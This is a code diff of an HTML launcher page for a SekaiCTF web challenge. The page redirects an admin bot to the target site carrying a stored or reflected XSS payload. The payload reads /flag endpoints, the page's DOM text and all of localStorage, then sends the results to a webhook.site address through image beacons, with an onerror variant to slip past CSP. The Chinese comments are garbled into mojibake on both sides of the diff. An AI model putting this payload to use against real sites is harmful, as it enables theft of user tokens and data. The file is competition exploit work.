@@ -7,18 +7,18 @@
   <style>body{font:14px/1.6 system-ui,Segoe UI,Arial;margin:2rem}code{background:#f6f8fa;padding:.2rem .4rem;border-radius:.3rem}</style>
 </head>
 <body>
-<h2>Launching¡­</h2>
+<h2>Launchingâ€¦</h2>
 <p>This page will auto-redirect the admin bot into target with an XSS payload.</p>
 <script>
-/*** ¡û¡û¡û Ö»¸ÄÕâÈıÏî ***/
-const TARGET_BASE = "https://nbv.chals.sekai.team/";   // Ä¿±êÕ¾
-const NOTE_PARAM  = "txt";                             // Èë¿Ú²ÎÊıÃû£¨²»È·¶¨¾ÍÊÔ note£©
-const EXFIL_URL   = "https://webhook.site/5d8375af-85a7-4809-a842-47a66eaf6dac"; // ½ÓÊÕ¶Ë
+/*** â†â†â† åªæ”¹è¿™ä¸‰é¡¹ ***/
+const TARGET_BASE = "https://nbv.chals.sekai.team/";   // ç›®æ ‡ç«™
+const NOTE_PARAM  = "txt";                             // å…¥å£å‚æ•°åï¼ˆä¸ç¡®å®šå°±è¯• noteï¼‰
+const EXFIL_URL   = "https://webhook.site/5d8375af-85a7-4809-a842-47a66eaf6dac"; // æ¥æ”¶ç«¯
 
-// ¡ª¡ª ÏÂÃæÊÇ»áÔÚÄ¿±êÕ¾ÉÏÏÂÎÄÖ´ĞĞµÄ´úÂë ¡ª¡ª
-// ¾¡Á¿ÓÃ¡°ÄÚÁª¿ÉÖ´ĞĞ¡±µÄĞ´·¨£¬¾¡Á¿ÉÙÒÀÀµÍâ²¿×ÊÔ´£¬±ÜÃâ CSP ¿¨ËÀ¡£
-// ²ßÂÔ£ºÒÀ´Î³¢ÊÔ£º/flag¡¢/api/flag¡¢DOM ÎÄ±¾¡¢localStorage£»
-// ÄÃµ½¶«Î÷ºóÓÃ¡°´òµãÍ¼Æ¬¡±·¢»Ø£¨<img src=¡­>£©£¬±ÜÃâ±» CSP ×èÖ¹ fetch µ½ÍâÓò¡£
+// â€”â€” ä¸‹é¢æ˜¯ä¼šåœ¨ç›®æ ‡ç«™ä¸Šä¸‹æ–‡æ‰§è¡Œçš„ä»£ç  â€”â€”
+// å°½é‡ç”¨â€œå†…è”å¯æ‰§è¡Œâ€çš„å†™æ³•ï¼Œå°½é‡å°‘ä¾èµ–å¤–éƒ¨èµ„æºï¼Œé¿å… CSP å¡æ­»ã€‚
+// ç­–ç•¥ï¼šä¾æ¬¡å°è¯•ï¼š/flagã€/api/flagã€DOM æ–‡æœ¬ã€localStorageï¼›
+// æ‹¿åˆ°ä¸œè¥¿åç”¨â€œæ‰“ç‚¹å›¾ç‰‡â€å‘å›ï¼ˆ<img src=â€¦>ï¼‰ï¼Œé¿å…è¢« CSP é˜»æ­¢ fetch åˆ°å¤–åŸŸã€‚
 function buildVictimJS(exfil) {
   return `(()=>{try{
     const send=(d)=>{new Image().src='${exfil}?d='+encodeURIComponent(d)};
@@ -28,44 +28,45 @@ function buildVictimJS(exfil) {
 
     (async()=>{
       let out='';
-      // 1) ³£¼ûÂ·¾¶
+      // 1) å¸¸è§è·¯å¾„
       for (const p of ['/flag','/api/flag','/flag.txt']) {
         if (out) break;
         out = await grabText(p);
         if (out && /SEKAI\\{|FLAG\\{|CTF/i.test(out)) { send('HIT '+p+' => '+out); return; }
       }
-      // 2) Ò³ÄÚËùÓĞÎÄ±¾¶µµ×
+      // 2) é¡µå†…æ‰€æœ‰æ–‡æœ¬å…œåº•
       try {
         const t = document.body && document.body.innerText || '';
         if (t && /SEKAI\\{|FLAG\\{|CTF/i.test(t)) { send('DOM => '+t); return; }
       } catch(_) {}
-      // 3) localStorage ¶µµ×
+      // 3) localStorage å…œåº•
       try {
         const ls = JSON.stringify(localStorage); 
         if (ls) send('LS => '+ls);
       } catch(_) {}
 
-      // 4) Ã»ÃüÖĞÒ²ÉÏ±¨Ò»ÏÂÒ³ÃæĞÅÏ¢
+      // 4) æ²¡å‘½ä¸­ä¹Ÿä¸ŠæŠ¥ä¸€ä¸‹é¡µé¢ä¿¡æ¯
       send('NO-HIT host='+location.host+' path='+location.pathname);
     })();
   }catch(e){ new Image().src='${exfil}?e='+encodeURIComponent('FATAL '+(e&&e.message)); }})();`;
 }
 
-// Ò»·İ <script> °æ±¾£¨³£¹æÇé¿öÏÂÓÅÏÈ£©
+// ä¸€ä»½ <script> ç‰ˆæœ¬ï¼ˆå¸¸è§„æƒ…å†µä¸‹ä¼˜å…ˆï¼‰
 const payloadScript = `<script>${buildVictimJS(EXFIL_URL)}<\/script>`;
 
-// Ò»·İ <img onerror> °æ±¾£¨ÓĞĞ©Õ¾½ûÓÃ <script> »ò CSP ÑÏÒ»µãÊ±¿ÉÊÔ£©
+// ä¸€ä»½ <img onerror> ç‰ˆæœ¬ï¼ˆæœ‰äº›ç«™ç¦ç”¨ <script> æˆ– CSP ä¸¥ä¸€ç‚¹æ—¶å¯è¯•ï¼‰
 const payloadImgOnErr = `<img src=x onerror="${buildVictimJS(EXFIL_URL).replace(/"/g,'&quot;')}">`;
 
-// Äã¿ÉÒÔ¶şÑ¡Ò»£ºÏÈÓÃ <script> °æ£¬Ê§°ÜÔÙ»» onerror °æ¡£
-const FINAL_PAYLOAD = payloadScript;
+// ä½ å¯ä»¥äºŒé€‰ä¸€ï¼šå…ˆç”¨ <script> ç‰ˆï¼Œå¤±è´¥å†æ¢ onerror ç‰ˆã€‚
+const FINAL_PAYLOAD = payloadImgOnErr;
 
-// Æ´³ö×îÖÕÌø×ª URL
+// æ‹¼å‡ºæœ€ç»ˆè·³è½¬ URL
 const u = new URL(TARGET_BASE);
 u.searchParams.set(NOTE_PARAM, FINAL_PAYLOAD);
 
-// 1 ÃëºóÌø×ª£¬¸øÈâÑÛÒ»¸ö·´Ó¦Ê±¼ä
+// 1 ç§’åè·³è½¬ï¼Œç»™è‚‰çœ¼ä¸€ä¸ªååº”æ—¶é—´
 setTimeout(()=>{ location.href = u.toString(); }, 1000);
 </script>
 </body>
 </html>
+
